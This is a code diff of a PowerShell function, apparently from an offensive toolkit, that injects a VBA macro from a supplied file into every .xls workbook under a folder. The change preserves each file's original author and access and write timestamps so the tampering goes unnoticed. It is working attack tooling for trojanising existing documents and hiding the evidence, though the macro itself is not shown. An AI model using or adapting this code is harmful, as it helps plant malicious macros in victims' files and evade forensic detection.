@@ -111,18 +111,24 @@ function Inject-Macro {
 			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse
 
 			ForEach ($ExcelFile in $ExcelFiles) {
+				# Get original document metadata
+				$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString("M/d/yyyy h:m tt")
+				$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString("M/d/yyyy h:m tt")
+
 				$Output = $ExcelFile
 				$Workbook = $XLS.Workbooks.Open($ExcelFile)
+				$Author = $Workbook.Author
 				$VBA = $Workbook.VBProject.VBComponents.Add(1)
 				$VBA.CodeModule.AddFromFile($Macro) | Out-Null
 
-				# Sanatize document metadata
-				$RemoveMetadata = "Microsoft.Office.Interop.Excel.XlRemoveDocInfoType" -as [type]
-				$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 
-
 				# Save the document
+				$Workbook.Author = $Author
 				$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
 				$XLS.Workbooks.Close()
+
+				# Re-write original document metadata
+				$(Get-Item $ExcelFile).LastAccessTime = $LAT
+				$(Get-Item $ExcelFile).LastWriteTime = $LWT
 
 				Write-Host "Macro sucessfully injected into $ExcelFile"
 			}
